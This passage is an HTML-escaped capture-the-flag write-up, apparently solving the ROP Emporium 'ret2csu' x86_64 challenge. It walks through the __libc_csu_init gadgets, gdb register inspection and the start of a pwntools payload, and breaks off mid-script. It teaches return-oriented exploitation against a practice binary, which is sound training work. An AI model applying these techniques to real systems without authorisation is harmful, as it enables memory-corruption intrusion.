  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;b0:	&lt;span style=&#34;color:#06b6ef&#34;&gt;f3&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;c3&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;repz&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;z&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;strong&gt;__libc_csu_init&lt;/strong&gt;  section contains a sequence of pop, ret instructions  which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control &lt;strong&gt;RBX, RBP, R12, R13, R14, and R15&lt;/strong&gt; registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.&lt;/p&gt;
&lt;p&gt;The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;a:	&lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbx
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;b:	&lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;c:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;e:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt; 
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a0:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;e&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a2:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a4:	&lt;span style=&#34;color:#06b6ef&#34;&gt;c3&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For the second stage, we need to look for the gadgets that will enable us to control the  &lt;strong&gt;RDI, RSI and RDX&lt;/strong&gt; registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in &lt;strong&gt;RDI, RSI and RDX&lt;/strong&gt; registers respectively. From the disassembly of &lt;strong&gt;__libc_csu_init&lt;/strong&gt; we can get our second gadget to build our rop chain.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt;    rdx,&lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt;    rsi,&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;mov&lt;/span&gt;    edi,r13d
&lt;span style=&#34;color:#06b6ef&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rbx&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above code, we are now able to control the &lt;strong&gt;rdx, rsi and edi&lt;/strong&gt; registers.The call in the second stage gadgets, calculates the destination address of our code.&lt;/p&gt;
&lt;p&gt;Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to &lt;strong&gt;ret2win&lt;/strong&gt; challenge.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This challenge is very similar to &amp;ldquo;callme&amp;rdquo;, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the &amp;ldquo;callme&amp;rdquo; challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp;amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx  respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;rdi&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;first&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;args&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;rsi&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;second&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;args&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;rdx&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;--&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;third&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;args&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the code snip above, we are now able to control the values of ropchain by setting the registers values as shown in the code above.
For debugging our exploit we will use python3 and gdb. Debugging our exploit ensures that there is no unexpected behavior in the code to avoid crashing of the program.&lt;/p&gt;
&lt;p&gt;For debugging purposes, we set a breakpoint in our first address of the ropchain gadget, and run our program with the generated payload.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;break&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x000000000040069a&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x40069a&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;tmp&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;payload&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Starting&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;program&lt;/span&gt;: &lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;vx&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;Downloads&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;rop&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;rop&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ret2csu&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ret2csu&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;tmp&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;payload&lt;/span&gt;

&lt;span style=&#34;color:#06b6ef&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f99b15&#34;&gt;0x000000000040069a&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt; ()
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;c&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Continuing.&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;ret2csu&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ROP&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;Emporium&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;x86_64&lt;/span&gt;

&lt;span style=&#34;color:#06b6ef&#34;&gt;Check&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;https&lt;/span&gt;:&lt;span style=&#34;color:#5bc4bf&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ropemporium.com&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;chal&lt;span style=&#34;color:#ef6155&#34;&gt;lenge&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ret2csu.html&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;information&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;how&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;solve&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;this&lt;/span&gt; chal&lt;span style=&#34;color:#ef6155&#34;&gt;lenge.&lt;/span&gt;

&lt;span style=&#34;color:#ef6155&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;Thank&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;you&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;!&lt;/span&gt;

&lt;span style=&#34;color:#06b6ef&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f99b15&#34;&gt;0x000000000040069a&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt; ()
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When the program is run,its hits the breakpoint. We enter &lt;strong&gt;c&lt;/strong&gt; command for continue, to continue the execution of our program. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of the breakpoint, the execution stops. Now we can inspect the memory addresses in order to understand the behavior of the program and the values loaded in the registers loaded in our first chain.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x40069a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbx
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x40069b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x40069c&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;92&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x40069e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x4006a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;96&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x4006a2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;98&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x4006a4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;x4006a5:	&lt;span style=&#34;color:#06b6ef&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;x4006a6:	&lt;span style=&#34;color:#06b6ef&#34;&gt;nop&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;WORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; cs:[rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x4006b0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_fini&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;repz&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can Single step through our assembly code and view the value stored in the register values of our gadget. The command for single stepping in gdb is &lt;strong&gt;si&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r&lt;/span&gt; rbx rbp &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;rbx&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0x4343434343434343&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;4846791580151137091&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;rbp&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0x4242424242424242&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;0x4242424242424242&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;r12&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0x4141414141414141&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;4702111234474983745&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;r13&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0xdeadbeefdeadbeef&lt;/span&gt;  &lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;2401053088876216593&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;r14&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0xcafebabecafebabe&lt;/span&gt;  &lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;3819410105351357762&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;r15&lt;/span&gt;            &lt;span style=&#34;color:#f99b15&#34;&gt;0xd00df00dd00df00d&lt;/span&gt;  &lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;3454841397007486963&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the analysis, we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#815ba4&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn&lt;/span&gt;

&lt;span style=&#34;color:#06b6ef&#34;&gt;pop_gadget&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwn.p64&lt;/span&gt;(&lt;span style=&#34;color:#f99b15&#34;&gt;0x0040069a&lt;/span&gt;)
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;fill&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;buffer&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;rbp(&lt;span style=&#34;color:#ef6155&#34;&gt;saved&lt;/span&gt;)
